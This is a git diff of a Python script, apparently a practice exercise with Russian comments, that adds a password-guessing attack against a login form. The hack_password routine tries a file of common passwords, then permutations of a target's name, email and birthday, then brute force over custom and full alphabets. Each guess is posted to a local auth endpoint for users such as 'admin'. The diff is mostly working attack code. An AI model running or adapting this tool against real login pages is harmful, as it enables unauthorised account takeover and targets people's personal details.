@@ -1,13 +1,12 @@
 # use Python 3.8
 import random
-import json
-from typing import Text, Iterable
+from typing import Text, Iterator
 import time
-
+import itertools
 import requests
 
-N = 10
 
+BAD_PASSWORD_FILE = './test.txt'
 URLS = ['https://www.avito.ru/',
         'https://www.speedtest.net/',
         'https://djbook.ru/',
@@ -15,6 +14,12 @@ URLS = ['https://www.avito.ru/',
         'https://www.simplifiedpython.net/',
         'https://ling47.ru/',
         ]
+
+USER_DATA = {'test': {'user_name': 'Иванов Иван Иванович',
+                      'user_email': 'test@yandex.ru',
+                      'user_birthday': '01/02/1975',
+                      },
+             }
 
 
 def test_url(what_url: Text, count: int = 10, sleep_time: int = 1) -> float:
@@ -40,13 +45,71 @@ def test_url(what_url: Text, count: int = 10, sleep_time: int = 1) -> float:
 
 
 def get_alphabet():
+    """Вернет состоящий из цифр и прописных символов англ. алфавита"""
     let = ''.join([chr(i) for i in range(97, 97 + 26)])
     numbers = '0123456789'
     alphabet = numbers + let
     return alphabet
 
 
+def translated(source: str):
+    """Транслитерация руссуих букв"""
+    source = source.lower()
+    rus = list('абвгдеёжзийклмнопрстуфхцчшщъыьэюя')
+    lat = list('abvgdeejziiklmnoprctufhtcssmyteyy')
+    result = ''
+    for ch in source:
+        if ch in rus:
+            index = rus.index(ch)
+            lat_ch = lat[index]
+        else:
+            lat_ch = ch
+        result += lat_ch
+    return result
+
+
+def rewrite_date(date: Text) -> Text:
+    """Удалит из даты разделители"""
+    if '.' in date:
+        date = date.replace('.', '')
+    if '-' in date:
+        date = date.replace('-', '')
+    if '/' in date:
+        date = date.replace('/', '')
+    return date
+
+
+def get_self_user_words(name: Text):
+    words = []
+    if name in USER_DATA:
+        words = USER_DATA[name]['user_name'].split(' ')
+        trans_words = []
+        for item in words:
+            spam = translated(item)
+            if spam not in words:
+                trans_words.append(spam)
+        words = trans_words
+        words.append(USER_DATA[name]['user_email'])
+        words.append(rewrite_date(USER_DATA[name]['user_birthday']))
+        for i in range(1, len(words) + 1):
+            for subset in itertools.permutations(words, i):
+                result = ''.join(subset)
+                yield result
+
+    return words
+
+
+def get_self_user_alphabet(name):
+    """вернет алфавит из символов присутствующих в Имени , Эл.почте и дне рождения пользователя без повторений"""
+    result = translated(USER_DATA[name]['user_name'])
+    result += USER_DATA[name]['user_email']
+    result += USER_DATA[name]['user_birthday']
+    result = set(result.replace(' ', '_'))
+    return ''.join(list(result))
+
+
 def encode(number, alphabet):
+    """закодирует число на базе алфавита"""
     result = ''
     base = len(alphabet)
     spam = number
@@ -57,12 +120,8 @@ def encode(number, alphabet):
     return result
 
 
-def get_brootforce():
-    alphabet = get_alphabet()
-
-    pass_len = 3
+def get_bruteforce(alphabet):
     counter = 0
-    password = ''
     while True:
         counter += 1
         password = encode(counter, alphabet)
@@ -83,10 +142,10 @@ def get_good_pass(password_length: int = 8) -> Text:
     return new_pass
 
 
-def get_bad_passwords() -> Iterable:
-    """Считываем count плохих паролей и отдаем их гениратор"""
+def get_bad_passwords(bad_password_file: Text) -> Iterator:
+    """Считываем  плохие пароли из файла и отдаем их гениратор"""
     reading_lines = []
-    with open('./test.txt', 'rt', encoding='utf-8') as file:
+    with open(bad_password_file, 'rt', encoding='utf-8') as file:
         reading_lines = file.readlines()
 
     def wrapper():
@@ -97,6 +156,7 @@ def get_bad_passwords() -> Iterable:
 
 
 def is_valid(name: Text, password: Text, url: Text) -> bool:
+    """Проверка пары имя/пароль на url"""
     data = {
         'login': name,
         'password': password,
@@ -108,27 +168,59 @@ def is_valid(name: Text, password: Text, url: Text) -> bool:
         return False
 
 
-def hack_password(name, url):
-    bad_gen = get_bad_passwords()
-    bust_gen = get_brootforce()
-    password = '1'
-    while password:
-        password = next(bad_gen)
-        if not password:
-            # В файле обшеизвестных не нашел
-            break
-
-        if is_valid(name,password,url):
-            return password
+def search_by_alphabet(name: Text, url: Text, alphabet: Text):
+    bust_gen = get_bruteforce(alphabet=alphabet)
     while True:
         password = next(bust_gen)
-        if is_valid(name,password,url):
+        if not password:
+            # при помощи словаря ничего не нашли
+            break
+        if is_valid(name, password, url):
             return password
+    return None
 
+
+def search_by_gen(name: Text, url: Text, genirator: Iterator):
+    password = '1'
+    while password:
+        password = next(genirator)
+        if not password:
+            break
+        if is_valid(name, password, url):
+            return password
+    return None
+
+
+def hack_password(name, url):
+    """Подбор пароля  для name на url"""
+    bad_gen = get_bad_passwords(BAD_PASSWORD_FILE)
+    print('Ищем по файлу')
+    password = search_by_gen(name, url, bad_gen)  # поиск по файлу плохих паролей
+    if password:
+        return password
+    if name in USER_DATA:
+        print('Ищем по словам пользователя')
+        user_words_gen = get_self_user_words(name)
+        password = search_by_gen(name, url, user_words_gen)  # поиск по словам в информации о пользователе
+        if password:
+            return password
+        print('Ищем по словарю пользователя')
+        user_alpha = get_self_user_alphabet(name)
+        user_alpha_gen = get_bruteforce(user_alpha)
+        password = search_by_gen(name, url, user_alpha_gen)  # поиск по алфавиту пользователя
+        if password:
+            return password
+    print('Ищем по большому словарю')
+    full_alpha = get_alphabet()
+    full_alpha_gen = get_bruteforce(full_alpha)
+    password = search_by_gen(name, url, full_alpha_gen)  # поиск по полному алфавиту
+    if password:
+        return password
+    return None
 
 
 def main():
-    user_names = ['admin', 'jack', 'cat']
+    user_names = ['admin', 'jack', 'cat', 'test']
     url = 'http://127.0.0.1:5000/auth'
     for name in user_names:
         user_password = hack_password(name, url)
@@ -137,25 +229,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-    # gen_bf = get_brootforce()
-    # for current in gen_bf:
-    #     print(current)
-    #     if len(current) >3:
-    #         break
-
-    # alph = get_alphabet()
-    # res = encode(40,alph)
-    # for i in range(100):
-    #     print(encode(i,alph))
-    # print(res)
-    # print('beg')
-    # bad_passwords = get_bad_passwords(count=20)
-    # for current_password in bad_passwords:
-    #     print(current_password)
-    #
-    # for url in URLS:
-    #     try:
-    #         time_period = test_url(what_url=url, count=100, sleep_time=5)
-    #         print(f'\nTest end with {time_period} sec')
-    #     except ConnectionError as ex:
-    #         print(ex.args)
